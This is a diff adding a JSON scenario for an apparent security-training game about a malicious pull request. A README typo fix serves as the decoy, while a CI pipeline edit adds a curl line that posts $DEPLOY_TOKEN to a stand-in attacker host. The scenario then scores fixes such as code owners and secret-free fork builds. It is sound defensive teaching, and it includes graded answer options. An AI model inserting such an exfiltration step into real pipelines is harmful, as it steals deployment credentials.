@@ -1,0 +1,416 @@
+{
+  "id": "malicious-pr",
+  "order": 702,
+  "title": "The friendly pull request",
+  "kind": "Malicious pull request",
+  "track": "git-security",
+  "pool": false,
+  "level": "Advanced",
+  "minutes": 9,
+  "maxPoints": 79,
+  "startsAt": 1035,
+  "brief": "17:55. A first time contributor opens a tidy pull request: a typo fix in the readme. It also touches a file in the CI folder.",
+  "role": "Platform engineer, reviewing a change on the Veltrix engineering team",
+  "insight": "The readme change is the lure. The change to the build pipeline is what runs with your secrets.",
+  "teaches": [
+    "Read what a change would run, not only what it says it does",
+    "Pipeline files need the same review as production code, from named owners",
+    "Builds triggered by outside contributors must not get secrets"
+  ],
+  "setup": [
+    {
+      "do": "world.set",
+      "path": "office.bench",
+      "value": {
+        "id": "malicious-pr",
+        "title": "Pull request 218: “Fix typo in README”",
+        "sub": "shipment-tracker · pull request",
+        "files": [
+          {
+            "path": "README.md",
+            "lang": "Diff",
+            "lines": [
+              "- Track shipments in realtime.",
+              "+ Track shipments in real time."
+            ],
+            "flaw": [],
+            "vulnerable": false
+          },
+          {
+            "path": ".ci/build.yml",
+            "lang": "Diff",
+            "lines": [
+              "  on: pull_request_target",
+              "  jobs:",
+              "    build:",
+              "      steps:",
+              "        - checkout: pull_request head",
+              "        - run: ./scripts/build.sh",
+              "+       - run: curl -s -d \"t=$DEPLOY_TOKEN\" https://collect.attacker.test/"
+            ],
+            "flaw": [
+              1,
+              5,
+              7
+            ],
+            "vulnerable": true
+          },
+          {
+            "path": ".github-style/CODEOWNERS",
+            "lang": "Config",
+            "lines": [
+              "# who must approve changes",
+              "src/**      @veltrix/dev-team",
+              "# .ci/ has no owner"
+            ],
+            "flaw": [
+              3
+            ],
+            "vulnerable": true
+          }
+        ],
+        "intro": "Open the diff, then let the pipeline run the pull request, the way an automatic build would.",
+        "attempts": [
+          {
+            "id": "readme",
+            "label": "Read the readme change",
+            "request": "git diff main..pr-218 -- README.md",
+            "response": "- Track shipments in realtime.\n+ Track shipments in real time.\n\nA harmless spelling fix.",
+            "fixedResponse": "- Track shipments in realtime.\n+ Track shipments in real time.",
+            "exploits": false
+          },
+          {
+            "id": "diff",
+            "label": "Read the pipeline change",
+            "request": "git diff main..pr-218 -- .ci/build.yml",
+            "response": "+ - run: curl -s -d \"t=$DEPLOY_TOKEN\" https://collect.attacker.test/\n\nA new step that sends the deploy token to an outside address.",
+            "fixedResponse": "No changes to .ci/ can be merged without an owner's review.",
+            "exploits": true
+          },
+          {
+            "id": "run",
+            "label": "Let the pipeline run the pull request",
+            "request": "CI: build pull request 218 (trigger: pull_request_target, secrets available)",
+            "response": "Step 3: curl ... collect.attacker.test\nDEPLOY_TOKEN sent.\n\nThe pull request ran with the repository's secrets, and the token is gone.",
+            "fixedResponse": "CI: pull request builds run without secrets and with a read only token.\nStep 3: curl ... blocked (no network egress, no token).",
+            "exploits": true
+          }
+        ],
+        "fix": {
+          "prompt": "Pick every change that makes a pipeline edit get read by someone who knows, and stops outside code touching your secrets.",
+          "options": [
+            {
+              "id": "owners",
+              "label": "Give the CI folder named code owners, and require their review to merge",
+              "code": [
+                "+ .ci/**   @veltrix/platform-security",
+                "+ branch rule: require code owner review"
+              ],
+              "why": "Someone who reads pipeline files for a living has to approve every change to them, however small the pull request looks.",
+              "good": true
+            },
+            {
+              "id": "nosec",
+              "label": "Build outside contributors' pull requests with no secrets and a read only token",
+              "code": [
+                "- on: pull_request_target",
+                "+ on: pull_request     # no secrets to forks",
+                "+ permissions: { contents: read }"
+              ],
+              "why": "Code from an outside contributor should never run next to your credentials.",
+              "good": true
+            },
+            {
+              "id": "env",
+              "label": "Keep deploy secrets in a protected environment that needs approval, and only on the main branch",
+              "code": [
+                "+ environment: production   # secrets only here, approval required",
+                "+ if: github.ref == 'refs/heads/main'"
+              ],
+              "why": "Even a merged mistake cannot use the deploy token without a second person and a protected branch.",
+              "good": true
+            },
+            {
+              "id": "trust",
+              "label": "Trust contributors who start with small typo fixes",
+              "code": [],
+              "why": "Small, friendly first pull requests are the standard opening. Trust is earned over time, and the pipeline still has to be safe without it.",
+              "good": false,
+              "bad": "weak"
+            },
+            {
+              "id": "green",
+              "label": "Rely on the build passing before merging",
+              "code": [
+                "+ require: status_checks passing"
+              ],
+              "why": "The malicious step passes: it succeeds, and sends the token. A green build says nothing about intent.",
+              "good": false,
+              "bad": "weak"
+            }
+          ]
+        },
+        "found": false,
+        "decided": false,
+        "fixed": false,
+        "picks": [],
+        "last": null
+      }
+    },
+    {
+      "do": "desktop.open",
+      "app": "bench"
+    },
+    {
+      "do": "room.banner",
+      "title": "Workbench",
+      "body": "Review pull request 218",
+      "icon": "code",
+      "object": "computer",
+      "action": "Open"
+    }
+  ],
+  "bonuses": [
+    {
+      "id": "b-read",
+      "when": {
+        "event": "bench:fileViewed",
+        "match": {
+          "vulnerable": true
+        }
+      },
+      "outcome": {
+        "points": 6,
+        "verdict": "careful",
+        "label": "Read the vulnerable code first",
+        "what": "Reading the code before attacking it tells you where to look, and why it fails.",
+        "ideal": "reads the code under review before trying to break it."
+      }
+    },
+    {
+      "id": "b-normal",
+      "when": {
+        "event": "bench:attempt",
+        "match": {
+          "exploited": false
+        }
+      },
+      "outcome": {
+        "points": 4,
+        "verdict": "careful",
+        "label": "Tried normal use first",
+        "what": "Knowing what a good request looks like is how you spot a bad one.",
+        "ideal": "establishes normal behaviour before testing the abnormal."
+      }
+    },
+    {
+      "id": "b-regress",
+      "when": {
+        "event": "bench:retest",
+        "match": {
+          "exploit": false,
+          "fixed": true
+        }
+      },
+      "outcome": {
+        "points": 4,
+        "verdict": "careful",
+        "label": "Checked normal use still works",
+        "what": "A fix that breaks real users gets reverted, and the bug comes back.",
+        "ideal": "tests that the fix did not break normal use."
+      }
+    }
+  ],
+  "guards": [],
+  "start": "exploit",
+  "stages": {
+    "exploit": {
+      "objective": "Reproduce the bug: read the Code tab, then use the Exploit tab on staging.",
+      "target": "computer",
+      "decision": true,
+      "insight": "The readme change is the lure. The change to the build pipeline is what runs with your secrets.",
+      "hint": {
+        "text": "Open the Workbench. Read the code, try normal use on the Exploit tab, then send the request that breaks it."
+      },
+      "on": [
+        {
+          "when": {
+            "event": "bench:attempt",
+            "match": {
+              "exploited": true
+            }
+          },
+          "outcome": {
+            "points": 15,
+            "verdict": "careful",
+            "label": "Reproduced the bug",
+            "what": "The readme change was harmless. A second file in the pipeline folder added one line that sent the deploy token to an outside address, and the pipeline ran it with the secrets available.",
+            "ideal": "proves a bug is real before fixing it.",
+            "card": {
+              "title": "The typo fix was the decoy",
+              "kicker": "Malicious pull request",
+              "body": [
+                "The readme change was harmless. A second file in the pipeline folder added one line that sent the deploy token to an outside address, and the pipeline ran it with the secrets available.",
+                "Nobody reviewed the CI folder, because nobody owned it."
+              ],
+              "ideal": "reproduces a bug first, so the fix can be proved to work."
+            }
+          },
+          "go": "fix"
+        }
+      ]
+    },
+    "fix": {
+      "objective": "Fix it: pick the changes on the Fix tab that close the hole for good, then apply the patch.",
+      "target": "computer",
+      "decision": true,
+      "hint": {
+        "text": "Pick every change that removes the cause. Avoid changes an attacker can walk around, and ones that do not touch the problem. Then Apply the patch."
+      },
+      "on": [
+        {
+          "when": {
+            "event": "bench:fixApplied",
+            "match": {
+              "ok": true
+            }
+          },
+          "outcome": {
+            "points": 35,
+            "verdict": "safe",
+            "label": "Applied a real fix",
+            "what": "Named owners read every pipeline change. Outside pull requests build with no secrets and a read only token. And the deploy token lives in a protected environment that needs approval, so even a merged mistake cannot use it alone.",
+            "ideal": "fixes the cause, not the symptom.",
+            "card": {
+              "title": "Nobody's code runs beside your secrets unreviewed",
+              "kicker": "Malicious pull request",
+              "body": [
+                "Named owners read every pipeline change. Outside pull requests build with no secrets and a read only token. And the deploy token lives in a protected environment that needs approval, so even a merged mistake cannot use it alone.",
+                "Treat the pipeline as production code, because it holds the keys to production."
+              ],
+              "ideal": "fixes the cause with the standard control, and adds defence in depth."
+            }
+          },
+          "go": "verify"
+        },
+        {
+          "when": {
+            "event": "bench:fixApplied",
+            "match": {
+              "bad": {
+                "includes": "weak"
+              }
+            }
+          },
+          "outcome": {
+            "points": -25,
+            "verdict": "unsafe",
+            "label": "Applied a fix that can be bypassed",
+            "what": "A polite first contribution is exactly what an attacker sends, and the malicious step passes the build, because it succeeds. Neither trust nor a green build says anything about what the code does.",
+            "ideal": "fixes the cause instead of blocking one payload or hiding the symptom.",
+            "card": {
+              "title": "A friendly face and a green tick",
+              "kicker": "Malicious pull request",
+              "body": [
+                "A polite first contribution is exactly what an attacker sends, and the malicious step passes the build, because it succeeds. Neither trust nor a green build says anything about what the code does.",
+                "Review what runs, and remove the secrets from what you cannot review."
+              ],
+              "ideal": "fixes the cause, and knows why a blocklist or a hidden field is not a fix.",
+              "rewindLabel": "Rewind to the Fix tab"
+            }
+          },
+          "go": "verify"
+        },
+        {
+          "when": {
+            "event": "bench:fixApplied"
+          },
+          "outcome": {
+            "points": -5,
+            "verdict": "risky",
+            "label": "Applied a patch that was not enough",
+            "what": "The patch missed part of the fix, or added a change that does not address the problem.",
+            "ideal": "closes the hole completely.",
+            "card": {
+              "title": "Not enough",
+              "kicker": "Malicious pull request",
+              "body": [
+                "The patch missed something that has to change, or included a change that does nothing for this bug. Open the Fix tab to see which options were right, missed, or wrong, and why.",
+                "A partial fix is the most dangerous kind: everyone assumes it is closed."
+              ],
+              "ideal": "closes the hole completely.",
+              "rewindLabel": "Rewind to the Fix tab"
+            }
+          },
+          "go": "verify"
+        }
+      ]
+    },
+    "verify": {
+      "objective": "Prove it: re-run the exploit on the Exploit tab, then check normal use still works.",
+      "target": "computer",
+      "decision": true,
+      "hint": {
+        "text": "On the Exploit tab, send the exploit again. It should be blocked. Then send the normal request to check nothing broke."
+      },
+      "on": [
+        {
+          "when": {
+            "event": "bench:retest",
+            "match": {
+              "blocked": true
+            }
+          },
+          "outcome": {
+            "points": 15,
+            "verdict": "safe",
+            "label": "Proved the exploit is blocked",
+            "what": "The same request that worked before now fails, and normal use still works.",
+            "ideal": "verifies a fix by re-running the exploit.",
+            "card": {
+              "title": "Fixed, and proved",
+              "kicker": "Malicious pull request",
+              "body": [
+                "You re-ran the exact request that broke it, and it is blocked. A fix you have not tested against the exploit is a hope, not a fix.",
+                "Add the exploit as an automated test so nobody can quietly bring the bug back."
+              ],
+              "ideal": "turns the exploit into a regression test."
+            }
+          },
+          "go": "done"
+        },
+        {
+          "when": {
+            "event": "bench:retest",
+            "match": {
+              "exploit": true,
+              "blocked": false
+            }
+          },
+          "outcome": {
+            "points": 0,
+            "verdict": "risky",
+            "label": "The exploit still works",
+            "what": "The patch did not close the hole. The same kind of request still gets through.",
+            "ideal": "never ships a fix without re-running the exploit.",
+            "rewind": false,
+            "card": {
+              "title": "Still open",
+              "kicker": "Malicious pull request",
+              "body": [
+                "The exploit still works after your patch. This is what happens when a fix blocks one payload, or hides a symptom, instead of removing the cause.",
+                "Go back over the Fix tab: it shows which options were right, and why the others fail."
+              ],
+              "ideal": "verifies with the exploit before calling it fixed.",
+              "rewind": false
+            }
+          },
+          "go": "done"
+        }
+      ]
+    },
+    "done": {
+      "end": true
+    }
+  }
+}
